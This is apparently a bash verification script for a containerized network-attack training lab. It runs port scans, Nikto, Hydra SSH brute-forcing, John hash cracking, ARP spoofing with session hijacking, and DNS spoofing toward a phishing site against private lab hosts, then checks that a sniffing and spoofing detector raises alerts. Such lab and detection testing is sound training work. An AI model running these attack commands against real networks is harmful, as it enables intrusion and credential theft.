#!/usr/bin/env bash
set -uo pipefail

LAB="network-ad"
MODE="${1:-full}"
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
PASS=0
FAIL=0
A="clab-${LAB}-attacker"
V="clab-${LAB}-victim"
T="clab-${LAB}-target"

check() {
  local name="$1"
  local status="$2"
  if [[ "$status" -eq 0 ]]; then
    printf '  PASS  %s\n' "$name"
    PASS=$((PASS + 1))
  else
    printf '  FAIL  %s\n' "$name"
    FAIL=$((FAIL + 1))
  fi
}

in_a() { docker exec "$A" bash -c "$1"; }
in_v() { docker exec "$V" bash -c "$1"; }
in_t() { docker exec "$T" bash -c "$1"; }

echo "========== smoke =========="
for node in target victim dns gateway attacker; do
  docker inspect -f '{{.State.Running}}' "clab-${LAB}-${node}" 2>/dev/null | grep -qx true
  check "节点 ${node} 正在运行" $?
done
in_t 'echo >/dev/tcp/127.0.0.1/80' && check "target HTTP" 0 || check "target HTTP" 1
in_t 'echo >/dev/tcp/127.0.0.1/443' && check "target HTTPS" 0 || check "target HTTPS" 1
in_v 'echo >/dev/tcp/127.0.0.1/22' && check "victim SSH" 0 || check "victim SSH" 1
in_a 'command -v nmap >/dev/null && command -v rustscan >/dev/null && command -v masscan >/dev/null && command -v arp-scan >/dev/null && command -v nikto >/dev/null && command -v hydra >/dev/null && command -v john >/dev/null && command -v tshark >/dev/null'
check "攻击工具" $?
in_v 'command -v sniff-detector >/dev/null' && check "检测器已安装" 0 || check "检测器已安装" 1

if [[ "$MODE" == "smoke" ]]; then
  printf '\n通过 %d，失败 %d\n' "$PASS" "$FAIL"
  [[ "$FAIL" -eq 0 ]]
  exit
fi

echo "========== 网络攻击 =========="
in_a 'pkill -x tcpdump 2>/dev/null || true; pkill -f "^python3 /opt/tools/arp_spoof.py" 2>/dev/null || true; pkill -f "^python3 /opt/tools/dns_spoof.py" 2>/dev/null || true'
result="$(in_a 'timeout 40 nmap -sV -Pn -T4 --version-light --max-retries 1 --host-timeout 25s -p 22,80,443 10.30.50.10' 2>/dev/null || true)"
grep -q '80/tcp.*open' <<<"$result"
check "Nmap 发现 HTTP" $?
grep -q '443/tcp.*open' <<<"$result"
check "Nmap 发现 HTTPS" $?

os_result="$(in_a 'nmap -O -Pn --osscan-guess --max-os-tries 2 10.30.50.10' 2>/dev/null || true)"
grep -q 'Running' <<<"$os_result"
check "Nmap 操作系统探测" $?

rust_result="$(in_a 'rustscan -a 10.30.50.10 -g -p 22,80,443 --ulimit 5000' 2>/dev/null || true)"
grep -q '22,80,443' <<<"$rust_result"
check "RustScan 定向端口发现" $?

mass_result="$(in_a 'timeout 20 bash /opt/tools/masscan-scan.sh 10.30.50.10 22,80,443 500' 2>&1 || true)"
grep -q '22/tcp' <<<"$mass_result"
check "masscan 定向端口扫描" $?

in_t 'curl -fsS http://127.0.0.1/vuln | grep -q FLAG_SCAN'
check "漏洞扫描目标可发现" $?
nikto_result="$(in_a 'nikto -h http://10.30.50.10 -nointeractive -ask no -maxtime 10s' 2>&1 || true)"
grep -qi 'x-lab-vulnerable' <<<"$nikto_result"
check "Nikto Web 漏洞扫描" $?
in_t 'curl -fsS http://127.0.0.1/loot/hashes.txt | grep -q "^alice:"'
check "哈希文件可获取" $?

in_a 'hydra -l alice -P /opt/wordlists/weak.txt -t 1 -f -q ssh://10.30.50.21' >/tmp/lab-hydra.out 2>&1 || true
grep -q 'password: victim123' /tmp/lab-hydra.out
check "Hydra 破解 SSH 弱口令" $?

ssh_flag="$(in_a "sshpass -p victim123 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null alice@10.30.50.21 'printenv FLAG_SSH'" 2>/dev/null || true)"
grep -q '^flag{' <<<"$ssh_flag"
check "SSH 登录读取随机 FLAG_SSH" $?

in_a 'curl -fsS http://10.30.50.10/loot/hashes.txt -o /tmp/hashes.txt && john --wordlist=/opt/wordlists/weak.txt /tmp/hashes.txt >/tmp/john.out 2>&1 && john --show /tmp/hashes.txt | grep -q victim123'
check "John 破解哈希" $?

in_a 'pkill -x tcpdump 2>/dev/null || true; pkill -f "^python3 /opt/tools/arp_spoof.py" 2>/dev/null || true'
in_a 'IF=$(ip -o -4 addr show | awk "/10\\.30\\.50\\.99/ {print \$2; exit}"); nohup timeout 90 tcpdump -i "$IF" -U -w /captures/verify-network.pcap >/tmp/td.out 2>&1 &'
VICTIM_MAC="$(in_v "IF=\$(ip -o -4 addr show | awk '/10\\.30\\.50\\.21/ {print \$2; exit}'); ip link show \"\$IF\" | awk '/link\\/ether/ {print \$2; exit}'")"
if [[ -n "$VICTIM_MAC" ]]; then
  in_a "IF=\$(ip -o -4 addr show | awk '/10\\.30\\.50\\.99/ {print \$2; exit}'); nohup timeout 80 python3 /opt/tools/arp_spoof.py -i \"\$IF\" --victim 10.30.50.21 --victim-mac $VICTIM_MAC --spoof 10.30.50.10 --spoof 10.30.50.254 >/tmp/arp.out 2>&1 &"
fi
sleep 15
in_a 'python3 /opt/tools/replay_session.py >/tmp/replay.out'
check "ARP 中间人 + 会话劫持/请求注入" $?
docker exec "$A" sh -c 'grep -q FLAG_INJECT /tmp/replay.out'
check "请求注入返回 flag" $?

in_a 'pkill -f "^python3 /opt/tools/dns_spoof.py" 2>/dev/null || true; rm -f /tmp/dns-hit'
VICTIM_MAC="$(in_v "IF=\$(ip -o -4 addr show | awk '/10\\.30\\.50\\.21/ {print \$2; exit}'); ip link show \"\$IF\" | awk '/link\\/ether/ {print \$2; exit}'")"
in_a "IF=\$(ip -o -4 addr show | awk '/10\\.30\\.50\\.99/ {print \$2; exit}'); nohup timeout 50 python3 /opt/tools/dns_spoof.py -i \"\$IF\" --victim 10.30.50.21 --victim-mac $VICTIM_MAC >/tmp/dns.out 2>&1 &"
sleep 18
in_a 'test -s /tmp/dns-hit && grep -q "FLAG\\|flag{" /tmp/dns-hit'
check "DNS 欺骗并诱导受害者访问钓鱼站" $?

echo "========== 攻击检测 =========="
in_a 'pkill -f "^python3 /opt/tools/arp_spoof.py" 2>/dev/null || true'
in_v ': >/var/log/sniff-detector.log'
in_a 'IF=$(ip -o -4 addr show | awk "/10\\.30\\.50\\.99/ {print \$2; exit}"); nohup timeout 70 tcpdump -i "$IF" >/dev/null 2>&1 &'
in_a 'nohup timeout 45 python3 /opt/tools/arp_spoof.py -i eth1 --victim 10.30.50.21 --spoof 10.30.50.10 --spoof 10.30.50.254 >/tmp/detect-arp.out 2>&1 &'
sleep 38
in_v 'grep -q "混杂模式候选" /var/log/sniff-detector.log'
check "检测器识别混杂模式嗅探" $?
in_v 'grep -Eq "ARP 翻转|一对多" /var/log/sniff-detector.log'
check "检测器识别 ARP 欺骗" $?
in_a 'pgrep -x tcpdump >/dev/null'
check "混杂模式抓包正在运行，供检测实验使用" $?

in_a 'pkill -x tcpdump 2>/dev/null || true'
sleep 1
pcap_ok=0
for filter in icmp dns 'tcp.flags.syn==1' tls.handshake; do
  in_a "tshark -r /captures/verify-network.pcap -Y '$filter' -c 1 >/dev/null 2>&1" || pcap_ok=1
done
check "pcap 包含 ICMP、DNS、TCP 握手和 TLS 握手" "$pcap_ok"

printf '\n通过 %d，失败 %d\n' "$PASS" "$FAIL"
[[ "$FAIL" -eq 0 ]]
